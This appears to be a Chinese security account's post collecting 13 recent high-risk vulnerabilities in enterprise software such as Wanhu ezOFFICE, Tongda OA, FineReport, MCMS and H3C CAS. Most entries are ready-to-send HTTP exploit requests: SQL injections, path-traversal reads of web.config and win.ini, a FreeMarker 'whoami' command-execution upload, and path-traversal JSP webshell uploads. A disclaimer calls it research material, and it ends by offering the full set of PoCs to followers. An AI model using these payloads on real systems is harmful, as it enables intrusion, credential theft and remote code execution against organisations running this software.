#  hvv漏洞合集   
泾弦安全  泾弦安全   2024-08-05 09:50  
  
**想第一时间看到我们的大图推送吗？赶紧把我们设为星标吧！这样您就不会错过任何精彩内容啦！感谢您的支持！🌟**  
  
**免责声明**  
  
       文章所涉及内容，仅供安全研究教学使用，由于传播、利用本文所提供的信息而造成的任何直接或间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。  
  
**2024.7.22-2024.8.2高危漏洞合集**  
  
1.万户ezOFFICE协同管理平台 getAutoCode SQL注入漏洞  
  
攻击路径：/defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp  
  
poc：  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">GET /defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&amp;head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C5%29--+YJdO&amp;field=field_name&amp;tabName=tfield HTTP/1.1</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host: </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Encoding: gzip, deflate</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Language: zh-CN,zh;q=0.9</span></section><section style="line-height: normal;"><span style="font-size: 12px;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36</span></section></td></tr></tbody></table>  
2.用友NC UserAuthenticationServlet 反序列化漏洞  
  
攻击路径：/servlet/~uapim/nc.bs.pub.im.UserAuthenticationServlet  
  
poc:  
文章后附有  
  
3.浪潮GS企业管理软件 xtdysrv.asmx 远程代码执行漏洞  
  
攻击路径：/cwbase/service/rps/xtdysrv.asmx  
  
poc:  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">POST /cwbase/service/rps/xtdysrv.asmx HTTP/1.1</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host: </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Type: text/xml; charset=utf-8</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Length: 16398</span></section><section style="line-height: normal;"><span style="font-size: 12px;">SOAPAction: &#34;http://tempuri.org/SavePrintFormatAssign&#34;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">cmd: whoami</span></section><section style="line-height: normal;"><br/></section><section style="line-height: normal;"><span style="font-size: 12px;">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">&lt;soap:Envelope xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">  &lt;soap:Body&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">    &lt;SavePrintFormatAssign xmlns=&#34;http://tempuri.org/&#34;&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">      &lt;psBizObj&gt;string&lt;/psBizObj&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">      &lt;psLxId&gt;string&lt;/psLxId&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">&lt;psLxMc&gt;string&lt;/psLxMc&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">      &lt;printOpByte&gt;恶意序列化数据&lt;/printOpByte&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">      &lt;printInfoByte&gt;&lt;/printInfoByte&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">    &lt;/SavePrintFormatAssign&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">  &lt;/soap:Body&gt;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">&lt;/soap:Envelope&gt;</span></section></td></tr></tbody></table>  
4.泛微e-cology9 /services/WorkPlanService 前台SQL注入漏洞  
  
攻击路径：/services/WorkPlanService  
  
poc：文章后附有  
  
5.金和OA C6 GeneralXmlhttpPage.aspx SQL注入漏洞  
  
攻击路径: /C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/  
  
poc：  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">GET /C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A4 HTTP/1.1  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host:   </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Upgrade-Insecure-Requests: 1  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Encoding: gzip, deflate  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Language: zh-CN,zh;q=0.9  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Cookie: ASP.NET\_SessionId=lm3qrfg3b3khewr0yiy2r3oa  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Connection: close </span></section></td></tr></tbody></table>  
6.赛蓝企业管理系统 GetJSFile 任意文件读取漏洞  
  
攻击路径：/Utility/GetJSFile  
  
poc：  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">GET /Utility/GetJSFile?filePath=../web.config HTTP/1.1</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host: </span></section><section style="line-height: normal;"><span style="font-size: 12px;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept: */*</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Encoding: gzip, deflate, br</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Connection: close</span></section></td></tr></tbody></table>  
7.通达OA V11.10 login.php SQL注入漏洞  
  
攻击路径：/ispirit/interface/login.php  
  
poc：  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">POST /ispirit/interface/login.php HTTP/1.1  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_12\_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.855.2 Safari/537.36  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Type: application/x-www-form-urlencoded  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host:   </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Length: 107  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">name=123&amp;pass=123&amp;\_SERVER[REMOTE\_ADDR]=1&#39;,&#39;10&#39;,(select+@`,&#39;`+or+if(1%3d1,1,(select+~0%2b1))+limit+0,1))--+&#39;  </span></section></td></tr></tbody></table>  
8.  
浪潮云财务系统 bizintegrationwebservice 命令执行漏洞  
  
攻击路径：/cwbase/gsp/webservice/bizintegrationwebservice/bizintegrationwebservice.asmx  
  
poc：文章后附有  
  
9.帆软FineReport ReportSever Sqlite注入导致远程代码执行漏洞  
  
攻击路径：/webroot/decision/view/ReportServer  
  
poc：  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">GET /webroot/decision/view/ReportServer?test=ssssss&amp;n=${a=sql(&#39;FRDemo&#39;,DECODE(&#39;%ef%bb%bfattach%20database%20%27%2E%2E%2Fwebapps%2Fwebroot%2Ftest%2Ejsp%27%20as%20%27test%27%3B&#39;),1,1)} HTTP/1.1  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host:   </span></section><section style="line-height: normal;"><span style="font-size: 12px;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,\*/\*;q=0.8  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Encoding: gzip, deflate  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Upgrade-Insecure-Requests: 1  </span></section></td></tr></tbody></table>  
10.润乾报表 dataSphereServlet 任意文件读取漏洞  
  
攻击路径：/demo/servlet/dataSphereServlet?action=11  
  
poc：  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">POST /demo/servlet/dataSphereServlet?action=11 HTTP/1.1</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host: </span></section><section style="line-height: normal;"><span style="font-size: 12px;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Type: application/x-www-form-urlencoded</span></section><section style="line-height: normal;"><br/></section><section style="line-height: normal;"><span style="font-size: 12px;">path=../../../../../../../../../../../windows/win.ini&amp;content=&amp;mode=</span></section></td></tr></tbody></table>  
11.满客宝智慧食堂系统 downloadWebFile 任意文件读取漏洞  
  
攻击路径：/base/api/v1/kitchenVideo/downloadWebFile  
  
poc：  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=a&amp;ossKey=/jars/mkb-job-admin/application-prod-job-private.yml HTTP/1.1</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host: </span></section></td></tr></tbody></table>  
12.铭飞MCMS 远程代码执行漏洞  
  
攻击路径：/static/plugins/ueditor/{version}/jsp/editor.do  
  
poc：  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">POST /static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=%7b%76%69%64%65%6f%55%72%6c%50%72%65%66%69%78%3a%27%27%2c%66%69%6c%65%4d%61%6e%61%67%65%72%4c%69%73%74%50%61%74%68%3a%27%27%2c%69%6d%61%67%65%4d%61%78%53%69%7a%65%3a%32%30%34%38%30%30%30%30%30%2c%76%69%64%65%6f%4d%61%78%53%69%7a%65%3a%32%30%34%38%30%30%30%30%30%2c%66%69%6c%65%4d%61%78%53%69%7a%65%3a%32%30%34%38%30%30%30%30%30%2c%66%69%6c%65%55%72%6c%50%72%65%66%69%78%3a%27%27%2c%69%6d%61%67%65%55%72%6c%50%72%65%66%69%78%3a%27%27%2c%69%6d%61%67%65%50%61%74%68%46%6f%72%6d%61%74%3a%27%2f%7b%5c%75%30%30%32%45%5c%75%30%30%32%45%5c%75%30%30%32%46%7d%7b%74%65%6d%70%6c%61%74%65%2f%31%2f%64%65%66%61%75%6c%74%2f%7d%7b%74%69%6d%65%7d%27%2c%66%69%6c%65%50%61%74%68%46%6f%72%6d%61%74%3a%27%2f%75%70%6c%6f%61%64%2f%31%2f%63%6d%73%2f%63%6f%6e%74%65%6e%74%2f%65%64%69%74%6f%72%2f%7b%74%69%6d%65%7d%27%2c%76%69%64%65%6f%50%61%74%68%46%6f%72%6d%61%74%3a%27%2f%75%70%6c%6f%61%64%2f%31%2f%63%6d%73%2f%63%6f%6e%74%65%6e%74%2f%65%64%69%74%6f%72%2f%7b%74%69%6d%65%7d%27%2c%22%69%6d%61%67%65%41%6c%6c%6f%77%46%69%6c%65%73%22%3a%5b%22%2e%70%6e%67%22%2c%20%22%2e%6a%70%67%22%2c%20%22%2e%6a%70%65%67%22%2c%20%22%2e%6a%73%70%78%22%2c%20%22%2e%6a%73%70%22%2c%22%2e%68%74%6d%22%5d%7d%0a&amp;action=uploadimage HTTP/1.1  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">User-Agent: xxx  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept: \*/\*  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Postman-Token: bb71767c-7223-4ba3-8151-c81b8a5dc1ec  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host: 127.0.0.1:8080  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Encoding: gzip, deflate  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Connection: close  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Type: multipart/form-data; boundary=--------------------------583450229485407027180070  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Length: 279  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">----------------------------583450229485407027180070  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Disposition: form-data; name=&#34;upload&#34;; filename=&#34;1.htm&#34;  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Type: image/png  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">&lt;#assign ex=&#34;freemarker.template.utility.Execute&#34;?new()&gt; ${ ex(&#34;whoami&#34;) }  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">----------------------------583450229485407027180070--  </span></section></td></tr></tbody></table>  
13.H3C-CAS管理平台文件上传漏洞  
  
访问/cas/fileUpload/upload接口  
  
poc（有两种上传方式）：  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><section style="line-height: normal;"><span style="font-size: 12px;">POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/update.jsp&amp;name=222 HTTP/1.1  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host: 172.16.33.199:8080  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: application/json, text/plain, */*  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Connection: close  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Referer: http://172.16.33.199:8080/cas/login Cookie:  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Length: 2212  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-range: bytes 0-10/20  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">jsp数据  </span></section><section style="line-height: normal;"><span style="font-size: 12px;"><br/></span></section><section style="line-height: normal;"><span style="font-size: 17px;">或者</span></section><section style="line-height: normal;"><br/></section><section style="line-height: normal;"><span style="font-size: 12px;">POST /cas/fileUpload/fd HTTP/1.1</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Host: </span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept-Encoding: gzip, deflate</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Accept: */*</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Connection: close</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Length: 217</span></section><section style="line-height: normal;"><br/></section><section style="line-height: normal;"><span style="font-size: 12px;">--a4d7586ac9d50625dee11e86fa69bc71</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Disposition: form-data; name=&#34;token&#34;</span></section><section style="line-height: normal;"><br/></section><section style="line-height: normal;"><span style="font-size: 12px;">/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/stc11.jsp</span></section><section style="line-height: normal;"><span style="font-size: 12px;">--a4d7586ac9d50625dee11e86fa69bc71</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;123.jsp&#34;</span></section><section style="line-height: normal;"><span style="font-size: 12px;">Content-Type: image/png</span></section><section style="line-height: normal;"><br/></section><section style="line-height: normal;"><span style="font-size: 12px;">&lt;% out.println(&#34;215882935&#34;);%&gt;  </span></section><section style="line-height: normal;"><span style="font-size: 12px;">--a4d7586ac9d50625dee11e86fa69bc71--</span></section><section style="line-height: normal;"><br/></section></td></tr></tbody></table>  
  
关注公众号并回复hvv漏洞获取最新相关漏洞全部poc  
  
